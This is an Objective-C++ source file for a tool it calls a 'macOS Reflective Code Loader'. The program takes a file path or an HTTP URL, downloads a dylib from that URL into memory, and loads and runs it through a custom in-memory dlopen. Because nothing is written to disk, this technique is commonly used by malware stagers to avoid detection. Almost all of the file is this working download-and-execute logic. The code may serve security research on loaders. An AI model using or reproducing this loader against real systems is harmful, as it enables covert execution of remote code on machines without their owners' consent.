//
//  main.m
//  customLoader
//

#import <stdio.h>
#import <stdlib.h>
#import <Foundation/Foundation.h>
#import <signal.h>

#import "custom_dlfcn.h"

void signal_handler(int sig) {
    printf("\n[!] Caught signal %d (%s)\n", sig,
           sig == SIGSEGV ? "SIGSEGV" :
           sig == SIGBUS ? "SIGBUS" :
           sig == SIGILL ? "SIGILL" : "UNKNOWN");
    printf("[!] Payload crashed after successful load!\n");
    printf("[!] This is a payload bug, not a loader bug.\n");
    exit(1);
}

int main(int argc, const char * argv[]) {
    // Install signal handlers
    signal(SIGSEGV, signal_handler);
    signal(SIGBUS, signal_handler);
    signal(SIGILL, signal_handler);

    void* handle = NULL;
    NSData* payload = nil;
    
    if(argc != 2)
    {
        printf("ERROR: please specify path/url to dylib (to load and execute from memory)\n\n");
        return -1;
    }
    
    printf("\nmacOS Reflective Code Loader\n");
    printf("(supports: MH_DYLIB, MH_BUNDLE, with or without LC_DYLD_CHAINED_FIXUPS)\n\n");
    
    sleep(1);
    
    if(strncmp(argv[1], "http", strlen("http")) == 0) {
        
        NSURL* url = nil;
        printf("[+] downloading from remote URL...\n");
        
        url = [NSURL URLWithString:[NSString stringWithUTF8String:argv[1]]];
        payload = [NSData dataWithContentsOfURL:url];
        printf("Payload downloaded with size %lu\n", static_cast<unsigned long>(payload.length));
    
    } else {
        
        NSString* path = nil;
        printf("[+] loading from file...\n");
        
        path = [NSString stringWithUTF8String:argv[1]];
        payload = [NSData dataWithContentsOfFile:path];
        
    }
    
    sleep(1);
    //sanity
    if(0 == payload.length)
    {
        printf("ERROR: Failed to download or read payload into memory.\n\n");
        exit(-1);
    }
    
    printf("    payload now in memory (size: %lu), ready for loading/linking...\n", static_cast<unsigned long>(payload.length));
    
    printf("\nPress any key to continue...\n");
    getchar();

    try {
        handle = custom_dlopen_from_memory((void*)payload.bytes, (int)payload.length);
        if (handle == NULL) {
            const char* error = custom_dlerror();
            printf("ERROR: custom_dlopen_from_memory failed: %s\n", error ? error : "unknown error");
            return -1;
        }

        printf("\nDone! Library loaded successfully.\n");
        printf("Process will keep running (Ctrl+C to exit)...\n");
        fflush(stdout);

        // Keep process alive so loaded library can run
        while (true) {
            sleep(60);
        }

    } catch (const char* msg) {
        printf("ERROR: Exception caught: %s\n", msg);
        return -1;
    } catch (...) {
        printf("ERROR: Unknown exception caught\n");
        return -1;
    }
   
    return 0;
}
